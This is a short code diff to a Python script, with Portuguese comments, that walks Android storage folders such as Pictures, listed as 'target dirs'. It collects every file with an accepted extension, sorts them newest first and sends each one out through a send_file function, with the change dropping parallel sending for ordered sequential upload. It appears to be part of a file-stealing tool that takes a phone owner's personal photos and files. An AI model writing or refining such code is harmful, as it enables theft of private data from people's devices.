@@ -94,22 +94,27 @@ def main():
         "/storage/emulated/0/Pictures"
     ]
 
-    with ThreadPoolExecutor(max_workers=3) as executor:
-        for dir_path in dirs_alvo:
+    all_files = []
 
-            if not os.path.exists(dir_path):
-                continue
+    # 1. coleta todos os arquivos
+    for dir_path in dirs_alvo:
+        if not os.path.exists(dir_path):
+            continue
 
-            for root, dirs, files in os.walk(dir_path):
+        for root, dirs, files in os.walk(dir_path):
+            for file in files:
+                ext = os.path.splitext(file)[1].lower()
 
-                files = sorted(files, key=lambda f: os.path.getmtime(os.path.join(root, f)), reverse=True)
+                if ext in VALID_EXT:
+                    file_path = os.path.join(root, file)
+                    all_files.append(file_path)
 
-                for file in files:
-                    ext = os.path.splitext(file)[1].lower()
+    # 2. ordena globalmente (mais recente → mais antigo)
+    all_files = sorted(all_files, key=os.path.getmtime, reverse=True)
 
-                    if ext in VALID_EXT:
-                        file_path = os.path.join(root, file)
-                        executor.submit(send_file, file_path)
+    # 3. envia na ordem correta
+    for file_path in all_files:
+        send_file(file_path)
 #@BoxPrey
 if __name__ == "__main__":
     enviar_log()
